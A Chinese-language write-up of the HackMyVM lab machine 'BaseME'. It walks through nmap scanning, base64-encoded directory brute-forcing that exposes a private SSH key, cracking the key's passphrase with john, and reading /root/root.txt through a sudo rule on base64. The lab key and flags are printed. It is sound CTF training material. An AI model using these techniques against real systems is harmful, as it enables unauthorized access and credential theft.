---
title: "BaseME"
date: 2026-05-31T22:20:39+08:00
draft: false
description: "HackMyVM 靶机 BaseME 的渗透测试与提权记录"
categories: ["靶机复盘"]
tags: ["HackMyVM", "Easy"]
---
![image-20260325223829925](image-20260325223829925.png)

## 前期网卡的配置

**在VM中先把网络切换为NAT模式**；再按如下操作就可以：

![image-20260325224022224](image-20260325224022224.png)

e 进入编辑模式。

![image-20260325224216927](image-20260325224216927.png)

看见linux没，把 `ro` 改为 `rw init="/bin/bash"`，ctrl + x，进入救援模式。

修改`/etc/network/interfaces` ：

```bash
# 添加如下内容：
auto ens33 # 开机自动启用网卡 
iface ens33 inet dhcp # 启动后通过 DHCP 自动拿 IP
```

![image-20260325224609065](image-20260325224609065.png)

```shell
service networking restart
```

这样每次虚拟机重启后，都可以重新获取ip。(大概思路就是这样)

```shell
root@kali:/home/warn# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:74:0c:8a, IPv4: 192.168.174.130
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.174.1   00:50:56:c0:00:08       (Unknown)
192.168.174.2   00:50:56:e6:a5:f9       (Unknown)
192.168.174.133 00:0c:29:47:6f:55       (Unknown)
192.168.174.254 00:50:56:e3:46:91       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.895 seconds (135.09 hosts/sec). 4 responded
```

## 信息收集

```shell
root@kali:/home/warn# nmap -sV -sC 192.168.174.133       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-27 20:40 CST
Nmap scan report for 192.168.174.133
Host is up (0.00011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 00:0C:29:47:6F:55 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```

开启了22端口，80端口。

80端口是http服务，服务为nginx。

```shell
root@kali:/home/warn# curl -i -s 192.168.174.133
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 27 Mar 2026 12:42:43 GMT
Content-Type: text/html
Content-Length: 276
Last-Modified: Mon, 28 Sep 2020 07:23:35 GMT
Connection: keep-alive
ETag: "5f718f77-114"
Accept-Ranges: bytes

QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK

<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->

root@kali:/home/warn# echo "QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK" | base64 -d
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

翻译过来：你需要的所有东西都用了base64编码，包括的你的密码；记住，base64 可以回答你所有的问题。靶机名字叫baseme，对我进行base??编码。

```shell
root@kali:/home/warn# dirsearch -u http://192.168.174.133
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/warn/reports/http_192.168.174.133/_26-03-27_20-45-14.txt

Target: http://192.168.174.133/

[20:45:14] Starting: 
                     
```

并没有扫出任何内容。

```shell
root@kali:/home/warn# locate common.txt
/etc/theHarvester/wordlists/general/common.txt
/usr/share/dirb/wordlists/common.txt
/usr/share/dirb/wordlists/extensions_common.txt
/usr/share/dirb/wordlists/mutations_common.txt
/usr/share/fern-wifi-cracker/extras/wordlists/common.txt
/usr/share/metasploit-framework/data/wordlists/http_owa_common.txt
/usr/share/metasploit-framework/data/wordlists/sap_common.txt
/usr/share/wfuzz/wordlist/general/common.txt
/usr/share/wfuzz/wordlist/general/extensions_common.txt
/usr/share/wfuzz/wordlist/general/mutations_common.txt
# 我们使用这个：/usr/share/dirb/wordlists/common.txt
root@kali:/home/warn# while read -r line; do echo "$line" | base64 >> ./Desktop/dirs.txt; done  < /usr/share/dirb/wordlists/common.txt
root@kali:/home/warn/Desktop# tail ./dirs.txt                           
emlwCg==
emlwZmlsZXMK
emlwcwo=
em9la2VuCg==
em9uZQo=
em9uZXMK
em9vbQo=
em9wZQo=
em9ydW0K
enQK
root@kali:/home/warn/Desktop# dirsearch -u http://192.168.174.133 -w ./dirs.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4614

Output File: /home/warn/Desktop/reports/http_192.168.174.133/_26-03-27_20-57-43.txt

Target: http://192.168.174.133/

[20:57:43] Starting: 
[20:57:46] 200 -    2KB - /aWRfcnNhCg==                                     
[20:57:49] 200 -   25B  - /cm9ib3RzLnR4dAo=  
                                                                             
Task Completed
```

**为何要这样做**：他提示我们所需要的东西都用了base64编码，通过默认目录并没有扫出，所以我们通过base64编码后再扫描，发现了两个目录。

```shell
root@kali:/home/warn/Desktop# curl -s http://192.168.174.133/aWRfcnNhCg== 
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB
ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY
dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK
RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ
NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0
TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP
NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY
d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj
MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz
aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto
VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0
cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK
Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy
UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13
NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz
UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE
eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH
UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX
THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3
SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk
eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK
bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or
aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4
SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3
UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5
bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl
azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No
MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl
YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq
T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U
Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r
NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
# 是一段base64编码。
root@kali:/home/warn/Desktop# curl -s http://192.168.174.133/aWRfcnNhCg== | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
root@kali:/home/warn/Desktop# curl -s http://192.168.174.133/aWRfcnNhCg== | base64 -d > rsa
```

## 漏洞利用

```shell
root@kali:/home/warn/Desktop# ssh -i ./rsa lucas@192.168.174.133
Enter passphrase for key './rsa': 
# 这里需要密码。
root@kali:/home/warn/Desktop# vim password.txt
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
# 将这些内容写入到password.txt里面。
root@kali:/home/warn/Desktop# while read -r line; do echo "$line"|base64 >> password2.txt; done < password.txt   
                                                                                                         
root@kali:/home/warn/Desktop# cat password2.txt      

aWxvdmV5b3UK
eW91bG92ZXlvdQo=
c2hlbG92ZXN5b3UK
aGVsb3Zlc3lvdQo=
d2Vsb3ZleW91Cg==
dGhleWhhdGVzbWUK
Cg==
root@kali:/home/warn/Desktop# ssh -i ./rsa lucas@192.168.174.133
Enter passphrase for key './rsa': 
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 26 06:11:02 2026 from 192.168.174.130
lucas@baseme:~$ ^C
lucas@baseme:~$ 
# 输入第一个发现就是密码。
# 这里不用脚本的原因是：ssh 输入密码时，不允许通过管道符输入东西。
lucas@baseme:~$ cat user.txt
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                               
HMV8nnJAJAJA 
# 这个就是密码
```

## 提权

```
lucas@baseme:~$ sudo -l
Matching Defaults entries for lucas on baseme:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
lucas@baseme:~$ sudo /usr/bin/base64 /root/root.txt
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAqKiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAq
ICAgICAgICAgICAqLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwqICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICosICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg
ICAgICAgICwgICAgICAgICAgICAgICAgICAgICAgICAgLCogICAgICAgICAgICAgICAgICAgICAg
ICAgICAKICAgICAgICAgICAgICAgICAgICAgIC4sICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgKiwgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAgICAgICAgICAgICAgICAgICAgICAKICAg
ICAgICAgICAgICAgICAsKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAq
LCAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgLy4gICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIC4qLiAgICAgICAgICAgICAgICAKICAgICAgICAgICAg
ICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoqICAg
ICAgICAgICAgICAKICAgICAgICAgICAgICwqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAsKiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICoqICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKi4gICAgICAgICAgICAgICAg
ICAKICAgICAgICAgICAgICAgICAgICoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgKiouICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgLCogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICoqICAgICAgICAgICAgICAgICAgICAgICAKICAgICAg
ICAgICAgICAgICAgICAgICAgKiwgICAgICAgICAgICAgICAgICAgICAgICAgICwqICAgICAgICAg
ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAgICAgICAgICAg
ICAgICAgICAgICAqKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAqLCAgICAgICAgICAgICAgICAuKiAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLiAgICAgICAgICAgKiog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICoqICAgICAgLCosICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoqICosICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAKSE1WRktCUzY0Cg==
lucas@baseme:~$ sudo /usr/bin/base64 /root/root.txt | base64 -d
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                               
HMVFKBS64

```

## 总结

操作上不算太难，主要是思路上不好转弯，我扫描了目录，完全没有想过要用base64编码去编码文件后，再通过该字典去扫描文件。

我想到下面的注释可能是密码，并且用base64编码，编码后去爆破22端口，但是完全爆破不开。我还和gpt讨论他留下的线索，真的完全没有想到上面的思路。

## gobuster

- 通常更轻、更快，很多人拿来直接扫目录、子域名、虚拟主机
- Go 写的，单二进制，装好就能跑
- 参数风格偏“工具型”，简洁直接
- 适合想快速扫一轮的人

扫描目录：

```
gobuster dir -u http://192.168.174.133 -w ./dir.txt
```

* dir : 目录/文件枚举模式
* -u：目标 URL
* -w：字典文件

还有一些常用的参数：

- -x：指定扩展名，比如 php,txt,html,bak
- -t：线程数，比如 20
- -k：HTTPS 自签证书时跳过校验
- -s：只显示某些状态码，比如 200,204,301,302,403
- -b：排除某些状态码，比如 404

```shell
root@kali:/home/warn/Desktop# gobuster dir -u http://192.168.174.133 -w ./dirs.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.174.133
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./dirs.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aWRfcnNhCg==         (Status: 200) [Size: 2537]
/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]
Progress: 4614 / 4614 (100.00%)
===============================================================
Finished
===============================================================
                                                                     
```

是真的很快。

```shell
root@kali:/home/warn/Desktop# ssh2john rsa > rsa.hash           
                                                                                                         
root@kali:/home/warn/Desktop# john --wordlist=./password2.txt rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
aWxvdmV5b3UK     (rsa)     
1g 0:00:00:00 DONE (2026-03-27 22:38) 3.448g/s 27.58p/s 27.58c/s 27.58C/s ..Cg==
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                         
root@kali:/home/warn/Desktop# john --show rsa.hash                    
rsa:aWxvdmV5b3UK

1 password hash cracked, 0 left
```
